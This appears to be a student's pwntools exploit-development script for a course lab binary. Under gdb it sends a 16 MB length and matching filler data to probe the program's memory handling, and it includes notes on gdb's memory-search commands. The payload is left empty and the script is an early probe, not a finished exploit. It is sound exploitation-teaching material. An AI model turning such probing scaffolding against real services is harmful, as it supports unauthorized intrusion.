#!/usr/bin/python3
# 2022.09.29.0942.EST
from pwn import *

#with remote("csc748.hostbin.org", 7053) as p:
with gdb.debug("./lab5-3.bin") as p:
    payload = b""

    a = p.recv()    # Prompt: Options Banner
    print(a)
    p.send(b"1\n")    # Option: Load Data
    a = p.recv()    # Prompt: Length
    print(a)
    #p.send(b"1024\n")
    #p.send(b"131072\n")    # 262144 = 0x20000
    #p.send(b"1048576\n")    # 1048576 = 0x100000
    p.send(b"16777216\n")    # 16777216 = 0x1000000
    a = p.recv()    # Prompt: Data
    print(a)
    #p.send(b"A"*1024 + b"\n")    # Sending data
    #p.send(b"A"*131072 + b"\n")    # Sending data
    #p.send(b"A"*1048576 + b"\n")    # Sending data
    p.send(b"A"*16777216 + b"\n")    # Sending data

    a = p.recv()    # Prompt: Options Banner
    print(a)

    #p.send(payload)
    p.interactive()


"""
gdb's search function is... finnicky
find [/SIZE-CHAR] [/MAX-COUNT] START-ADDRESS, END-ADDRESS, EXPR1 [, EXPR2 ...]
find [/SIZE-CHAR] [/MAX-COUNT] START-ADDRESS, +LENGTH, EXPR1 [, EXPR2 ...]

Can use [info proc mappings] (or really vmmap for better details) to get useful information
"""